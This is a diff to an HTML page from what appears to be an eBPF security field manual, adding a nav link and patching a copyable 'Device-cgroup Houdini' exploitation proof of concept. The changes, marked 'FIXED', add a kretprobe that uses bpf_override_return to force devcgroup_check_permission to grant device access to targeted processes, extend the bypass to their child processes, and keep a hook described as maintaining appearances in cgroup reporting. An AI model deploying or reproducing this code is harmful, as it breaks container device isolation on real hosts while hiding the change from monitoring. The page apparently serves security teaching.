@@ -53,6 +53,13 @@
                 
                     
                     
+                    <a href="/dBPF/chapter-0-field-manual-preface.html" >
+                        Chapter 0: Field Manual Preface
+                    </a>
+                    
+                
+                    
+                    
                     <a href="/dBPF/the-mirror-controls.html" >
                         The Mirror Controls
                     </a>
@@ -608,6 +615,25 @@ graph TD
 254
 255
 256
+257
+258
+259
+260
+261
+262
+263
+264
+265
+266
+267
+268
+269
+270
+271
+272
+273
+274
+275
 </pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
 <span class="c1">// @copyable: true</span>
 <span class="c1">// Device-cgroup Houdini - eBPF exploitation proof of concept</span>
@@ -798,7 +824,7 @@ graph TD
     <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook the device-cgroup permission check function</span>
+<span class="c1">// FIXED: Hook the device-cgroup permission check function</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/devcgroup_check_permission"</span><span class="p">)</span>
 <span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_devcgroup</span><span class="p">,</span> <span class="kt">short</span> <span class="n">type</span><span class="p">,</span> <span class="n">u32</span> <span class="n">major</span><span class="p">,</span> <span class="n">u32</span> <span class="n">minor</span><span class="p">,</span> <span class="kt">short</span> <span class="n">access</span><span class="p">)</span>
 <span class="p">{</span>
@@ -823,14 +849,26 @@ graph TD
             
             <span class="c1">// Log the event for our analysis</span>
             <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
-            
-            <span class="c1">// Allow access by returning 0</span>
-            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
         <span class="p">}</span>
     <span class="p">}</span>
     
-    <span class="c1">// Let the original function run for other cases</span>
-    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="c1">// Let the original function run</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// FIXED: Use kretprobe to modify return value</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kretprobe/devcgroup_check_permission"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KRETPROBE</span><span class="p">(</span><span class="n">hook_devcgroup_ret</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    
+    <span class="c1">// Check if this process should bypass device-cgroup</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">should_bypass_process</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Override the return value to allow access</span>
+        <span class="n">bpf_override_return</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
 <span class="c1">// Hook the cgroup reporting function to maintain appearances</span>
@@ -845,21 +883,28 @@ graph TD
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Add child processes to our tracking map</span>
+<span class="c1">// FIXED: Add child processes to our tracking map</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/wake_up_new_task"</span><span class="p">)</span>
 <span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_new_task</span><span class="p">,</span> <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">)</span>
 <span class="p">{</span>
-    <span class="n">u32</span> <span class="n">parent_pid</span><span class="p">;</span>
-    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parent_pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">parent_pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">real_parent</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">);</span>
+    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">parent</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parent</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">parent</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">real_parent</span><span class="p">);</span>
     
-    <span class="c1">// If parent is in our target list, add the child too</span>
-    <span class="n">u8</span> <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">parent_pid</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">target</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">target</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">u32</span> <span class="n">child_pid</span><span class="p">;</span>
-        <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">child_pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">child_pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">parent</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">pid_t</span> <span class="n">parent_pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parent_pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">parent_pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">parent</span><span class="o">-&gt;</span><span class="n">tgid</span><span class="p">);</span>
         
-        <span class="n">u8</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">child_pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        <span class="c1">// If parent is in our target list, add the child too</span>
+        <span class="n">u32</span> <span class="n">parent_pid_u32</span> <span class="o">=</span> <span class="p">(</span><span class="n">u32</span><span class="p">)</span><span class="n">parent_pid</span><span class="p">;</span>
+        <span class="n">u8</span> <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">parent_pid_u32</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">target</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">target</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">pid_t</span> <span class="n">child_pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">child_pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">child_pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">tgid</span><span class="p">);</span>
+            
+            <span class="n">u8</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="n">u32</span> <span class="n">child_pid_u32</span> <span class="o">=</span> <span class="p">(</span><span class="n">u32</span><span class="p">)</span><span class="n">child_pid</span><span class="p">;</span>
+            <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">child_pid_u32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        <span class="p">}</span>
     <span class="p">}</span>
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
